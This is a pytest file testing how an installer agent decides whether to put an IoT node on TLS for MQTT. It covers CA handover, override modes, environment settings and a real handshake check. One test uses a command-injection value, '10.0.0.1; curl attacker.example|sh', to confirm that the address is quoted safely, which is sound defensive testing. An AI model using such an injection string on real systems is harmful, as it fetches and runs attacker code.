"""A deploy puts a node on TLS only when its broker answers TLS from that node.

Switching a node to TLS on a broker that serves none would strand it: the runner
refuses to fall back, rightly, so a redeploy would take a working node offline. So
the node is handed the CA this server trusts and checks, from where it stands, that
the broker answers TLS with it. `DEPLOY_<NODE>_BROKER_TLS` overrides the check.
"""

import contextlib
import shlex
import socket
import ssl
import subprocess
import sys
import threading
from collections.abc import Iterator
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from wactorz.agents import installer_agent
from wactorz.agents.installer_agent import InstallerAgent, NodeTls, tls_check_command, tls_mode
from wactorz.config import CONFIG, DeployTarget
from wactorz.core import broker_tls

HOME = "/home/pi"
NODE_CA = f"{HOME}/wactorz/{installer_agent.NODE_CA_FILE}"


class FakeConn:
    """Answers the node's TLS check as a test says, recording what was run."""

    def __init__(self, ok: bool = True, output: str = "") -> None:
        self.ok = ok
        self.output = output
        self.commands: list[str] = []

    async def run(self, command: str, check: bool = False) -> Any:
        self.commands.append(command)
        return SimpleNamespace(exit_status=0 if self.ok else 1, stdout=self.output, stderr="")


class FakeSftp:
    """Records uploads and written files, standing in for asyncssh's SFTP client."""

    def __init__(self) -> None:
        self.uploaded: dict[str, str] = {}
        self.written: dict[str, str] = {}

    async def put(self, local: str, remote: str) -> None:
        self.uploaded[remote] = local

    def open(self, path: str, _mode: str) -> Any:
        written = self.written

        class _Handle:
            async def write(self, body: str) -> None:
                written[path] = body

            async def __aenter__(self) -> "_Handle":
                return self

            async def __aexit__(self, *_exc: object) -> None:
                return None

        return _Handle()

    async def chmod(self, path: str, mode: int) -> None:
        return None


@pytest.fixture(name="server")
def server_fixture(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Any:
    """Configure what this server trusts: ``ca`` and ``check`` as MQTT_TLS_CA and its override."""
    monkeypatch.setenv("WACTORZ_STATE_DIR", str(tmp_path / "state"))

    def _configure(ca: str = "", check: str = "") -> None:
        monkeypatch.setattr(
            installer_agent,
            "CONFIG",
            replace(CONFIG, mqtt_tls_ca=ca, mqtt_tls_check_hostname=check),
        )

    _configure()
    return _configure


@pytest.fixture(name="generated")
def generated_fixture(server: Any) -> broker_tls.BrokerFiles:
    return broker_tls.ensure()


def _agent() -> Any:
    agent = InstallerAgent.__new__(InstallerAgent)
    agent.name = "installer"
    return agent


def _target(**over: Any) -> DeployTarget:
    return DeployTarget(name="rpi", host="10.0.0.5", broker="10.0.0.1", **over)


async def _decide(target: DeployTarget, conn: FakeConn, sftp: FakeSftp) -> NodeTls:
    return await _agent()._decide_node_tls(conn, sftp, target, HOME, "10.0.0.1", 1883)


# ── Unset: check from the node ─────────────────────────────────────────────────


class TestChecked:
    async def test_a_broker_answering_tls_gets_the_node_on_tls(
        self, generated: broker_tls.BrokerFiles
    ) -> None:
        conn, sftp = FakeConn(), FakeSftp()

        tls = await _decide(_target(), conn, sftp)

        assert tls.enabled
        assert tls.port == 8883
        assert tls.ca == NODE_CA
        assert sftp.uploaded == {NODE_CA: str(generated.ca)}
        # This install's own CA signs nothing else, so the hostname is not checked.
        assert tls.check_hostname is False
        assert len(conn.commands) == 1

    async def test_a_broker_not_answering_tls_keeps_the_node_on_plain_mqtt(
        self, generated: broker_tls.BrokerFiles
    ) -> None:
        conn = FakeConn(ok=False, output="[Errno 111] Connection refused")

        tls = await _decide(_target(), conn, FakeSftp())

        assert not tls.enabled
        assert tls.port == 1883
        assert "Connection refused" in tls.note

    async def test_no_ca_to_hand_over_keeps_plain_mqtt_without_asking_the_node(
        self, server: Any
    ) -> None:
        conn, sftp = FakeConn(), FakeSftp()

        tls = await _decide(_target(), conn, sftp)

        assert not tls.enabled
        assert tls.port == 1883
        assert conn.commands == []
        assert sftp.uploaded == {}

    async def test_the_targets_tls_port_is_the_one_checked_and_used(
        self, generated: broker_tls.BrokerFiles
    ) -> None:
        conn = FakeConn()

        tls = await _decide(_target(broker_tls_port=18883), conn, FakeSftp())

        assert tls.port == 18883
        assert shlex.split(conn.commands[0])[4] == "18883"


# ── Overrides ──────────────────────────────────────────────────────────────────


class TestOverridden:
    async def test_off_skips_all_of_it(self, generated: broker_tls.BrokerFiles) -> None:
        conn, sftp = FakeConn(), FakeSftp()

        tls = await _decide(_target(broker_tls="off"), conn, sftp)

        assert not tls.enabled
        assert conn.commands == []
        assert sftp.uploaded == {}

    async def test_on_gives_tls_even_when_the_check_fails(
        self, generated: broker_tls.BrokerFiles
    ) -> None:
        tls = await _decide(
            _target(broker_tls="on"), FakeConn(ok=False, output="timed out"), FakeSftp()
        )

        assert tls.enabled
        assert tls.port == 8883
        assert "timed out" in tls.note

    async def test_on_without_a_ca_fails_the_deploy(self, server: Any) -> None:
        with pytest.raises(ValueError, match="no CA"):
            await _decide(_target(broker_tls="on"), FakeConn(), FakeSftp())

    async def test_a_value_that_is_not_a_mode_fails_the_deploy(self, server: Any) -> None:
        with pytest.raises(ValueError, match="DEPLOY_RPI_BROKER_TLS"):
            await _decide(_target(broker_tls="sometimes"), FakeConn(), FakeSftp())

    def test_the_modes(self) -> None:
        assert tls_mode("") == tls_mode("auto") == "auto"
        assert tls_mode(" ON ") == tls_mode("1") == "on"
        assert tls_mode("false") == tls_mode("off") == "off"
        assert tls_mode("maybe") is None


# ── Which CA ───────────────────────────────────────────────────────────────────


class TestWhichCA:
    async def test_your_own_ca_is_handed_over_and_the_hostname_checked(
        self, server: Any, tmp_path: Path
    ) -> None:
        own = broker_tls.ensure(directory=tmp_path / "own-ca")
        server(ca=str(own.ca))
        sftp = FakeSftp()

        tls = await _decide(_target(), FakeConn(), sftp)

        assert sftp.uploaded == {NODE_CA: str(own.ca)}
        assert tls.check_hostname is True

    async def test_the_system_store_hands_over_no_file(self, server: Any) -> None:
        server(ca="system")
        sftp = FakeSftp()

        tls = await _decide(_target(), FakeConn(), sftp)

        assert tls.enabled
        assert tls.ca == "system"
        assert tls.check_hostname is True
        assert sftp.uploaded == {}

    async def test_the_servers_hostname_override_goes_to_the_node(
        self, generated: broker_tls.BrokerFiles, server: Any
    ) -> None:
        server(check="1")

        tls = await _decide(_target(), FakeConn(), FakeSftp())

        assert tls.check_hostname is True


# ── What the node is given ─────────────────────────────────────────────────────


class TestTheNodeEnvironment:
    async def test_a_node_on_tls_gets_every_setting_spelled_out(self) -> None:
        sftp = FakeSftp()
        tls = NodeTls(enabled=True, port=8883, ca=NODE_CA, check_hostname=False)

        await _agent()._put_node_env(sftp, _target(), HOME, "rpi", "10.0.0.1", tls.port, tls)

        lines = sftp.written[f"{HOME}/wactorz/.env"].splitlines()
        assert "MQTT_TLS=1" in lines
        assert f"MQTT_TLS_CA={NODE_CA}" in lines
        assert "MQTT_TLS_CHECK_HOSTNAME=0" in lines
        assert "WACTORZ_PORT=8883" in lines

    async def test_a_node_on_plain_mqtt_gets_none_of_them(self) -> None:
        sftp = FakeSftp()

        await _agent()._put_node_env(
            sftp, _target(), HOME, "rpi", "10.0.0.1", 1883, NodeTls(enabled=False, port=1883)
        )

        assert "MQTT_TLS" not in sftp.written[f"{HOME}/wactorz/.env"]

    def test_a_hostile_broker_address_reaches_the_check_as_one_argument(self) -> None:
        hostile = "10.0.0.1; curl attacker.example|sh"
        tls = NodeTls(enabled=True, port=8883, ca="/home/pi/wactorz/mqtt-ca.crt")

        argv = shlex.split(tls_check_command(hostile, tls))

        assert argv[:2] == ["python3", "-c"]
        assert argv[3] == hostile
        assert argv[5] == tls.ca


# ── The check itself ───────────────────────────────────────────────────────────


@contextlib.contextmanager
def _tls_broker(files: broker_tls.BrokerFiles) -> Iterator[int]:
    """A listener that completes one TLS handshake with the broker certificate."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(files.cert, files.key)
    listener = socket.create_server(("127.0.0.1", 0))

    def _serve() -> None:
        with contextlib.suppress(OSError):
            conn, _ = listener.accept()
            with conn, context.wrap_socket(conn, server_side=True):
                pass

    thread = threading.Thread(target=_serve, daemon=True)
    thread.start()
    try:
        yield listener.getsockname()[1]
    finally:
        listener.close()
        thread.join(timeout=5)


def _run_check(
    port: int, ca: str, check_hostname: bool = False
) -> subprocess.CompletedProcess[str]:
    """Run the check as the node would, with this interpreter standing in for python3."""
    tls = NodeTls(enabled=True, port=port, ca=ca, check_hostname=check_hostname)
    argv = shlex.split(tls_check_command("127.0.0.1", tls))
    argv[0] = sys.executable
    return subprocess.run(argv, capture_output=True, text=True, timeout=30, check=False)


class TestTheCheckOnTheNode:
    def test_it_passes_against_a_broker_serving_the_issued_certificate(
        self, generated: broker_tls.BrokerFiles
    ) -> None:
        with _tls_broker(generated) as port:
            result = _run_check(port, str(generated.ca))
        assert result.returncode == 0, result.stdout

    def test_it_fails_with_a_ca_from_another_install(
        self, generated: broker_tls.BrokerFiles, tmp_path: Path
    ) -> None:
        other = broker_tls.ensure(directory=tmp_path / "another-install")
        with _tls_broker(generated) as port:
            result = _run_check(port, str(other.ca))
        assert result.returncode == 1
        assert "certificate verify failed" in result.stdout

    def test_it_fails_when_nothing_listens(self, generated: broker_tls.BrokerFiles) -> None:
        with socket.create_server(("127.0.0.1", 0)) as probe:
            closed = probe.getsockname()[1]
        result = _run_check(closed, str(generated.ca))
        assert result.returncode == 1
        assert result.stdout.strip()
